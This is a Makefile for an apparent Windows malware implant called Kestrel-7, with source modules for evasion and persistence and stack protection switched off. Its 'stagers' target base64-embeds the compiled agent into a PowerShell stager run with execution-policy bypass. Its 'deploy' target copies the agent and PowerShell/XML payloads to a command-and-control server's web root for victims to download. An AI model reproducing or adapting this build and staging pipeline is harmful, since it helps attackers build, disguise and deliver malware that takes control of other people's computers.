# Makefile - Cross-platform build for Kestrel-7
# Usage: make (debug) | make release | make clean | make deploy

CC = cl.exe
CXX = cl.exe
RC = rc.exe
LINK = link.exe

TARGET = kestrel7_agent.exe
TARGET_DLL = kestrel7_dll.dll

# Compiler flags
CFLAGS = /EHsc /MT /O2 /GS- /DNDEBUG /D_WIN32_WINNT=0x0A00
CFLAGS_DEBUG = /EHsc /MTd /Od /GS- /Zi /D_DEBUG /D_WIN32_WINNT=0x0A00

# Linker flags
LFLAGS = /NXCOMPAT /DYNAMICBASE /OPT:REF /OPT:ICF /LTCG
LFLAGS_DEBUG = /DEBUG /PDB:$(TARGET).pdb

# Libraries
LIBS = ws2_32.lib winhttp.lib advapi32.lib wbemuuid.lib psapi.lib user32.lib

# Source files
SRCS = src/main.cpp src/crypto.cpp src/network.cpp src/evasion.cpp src/persistence.cpp src/utils.cpp
OBJS = $(SRCS:src/%.cpp=bin/obj/%.obj)

# Default target
all: release

# Release build
release: CFLAGS += /GL
release: LFLAGS += /LTCG
release: $(TARGET)

# Debug build
debug: CFLAGS = $(CFLAGS_DEBUG)
debug: LFLAGS = $(LFLAGS_DEBUG)
debug: $(TARGET)

# Rule for building object files
bin/obj/%.obj: src/%.cpp
	@if not exist bin\obj mkdir bin\obj
	$(CXX) /c $(CFLAGS) /Fo$@ $<

# Link target
$(TARGET): $(OBJS)
	$(LINK) $(LFLAGS) $(OBJS) $(LIBS) /OUT:bin/$@
	@echo [*] Build complete: bin/$(TARGET)
	@dir bin\$(TARGET) | find "$(TARGET)"

# Build DLL version
dll: CFLAGS += /GL /D_DLL
dll: LFLAGS += /DLL
dll: $(OBJS)
	$(LINK) /DLL $(LFLAGS) $(OBJS) $(LIBS) /OUT:bin/$(TARGET_DLL)
	@echo [*] DLL build complete: bin/$(TARGET_DLL)

# Generate stagers
stagers: $(TARGET)
	@echo [*] Generating stagers...
	@powershell -exec bypass -Command " \
		$$bytes = [IO.File]::ReadAllBytes('bin\$(TARGET)'); \
		$$b64 = [Convert]::ToBase64String($$bytes); \
		$$stager = Get-Content payloads\stager.ps1 -Raw; \
		$$stager = $$stager -replace 'BASE64_ENCODED_SHELLCODE_HERE', $$b64; \
		$$stager | Out-File payloads\stager_final.ps1 -Encoding ASCII"
	@echo [*] Stagers generated in payloads/

# Deploy to remote server
deploy: release stagers
	@echo [*] Deploying to C2 server...
	scp bin/$(TARGET) user@c2-server:/var/www/html/agent.exe
	scp payloads/*.ps1 user@c2-server:/var/www/html/
	scp payloads/*.xml user@c2-server:/var/www/html/
	@echo [*] Deployment complete

# Clean build artifacts
clean:
	@if exist bin rmdir /s /q bin
	@if exist payloads\*_final.* del payloads\*_final.*
	@echo [*] Clean complete

# Full clean (includes stagers)
distclean: clean
	@del payloads\*.ps1 payloads\*.xml payloads\*.vbs payloads\*.hta 2>nul
	@echo [*] Distclean complete

# Run the agent
run: release
	bin\$(TARGET) --install

# Test in sandbox
test: debug
	@echo [*] Running tests...
	bin\$(TARGET) --test

# Generate documentation
docs:
	doxygen Doxyfile 2>nul || echo [*] Doxygen not installed

# Help
help:
	@echo ============================================
	@echo   Kestrel-7 Makefile
	@echo ============================================
	@echo.
	@echo make release     - Build optimized release (default)
	@echo make debug       - Build debug version with symbols
	@echo make dll         - Build DLL version
	@echo make stagers     - Generate stager scripts
	@echo make deploy      - Deploy to C2 server
	@echo make clean       - Remove build artifacts
	@echo make distclean   - Full clean
	@echo make run         - Build and run
	@echo make test        - Build and test
	@echo make docs        - Generate Doxygen docs
	@echo.

.PHONY: all release debug dll stagers deploy clean distclean run test docs help
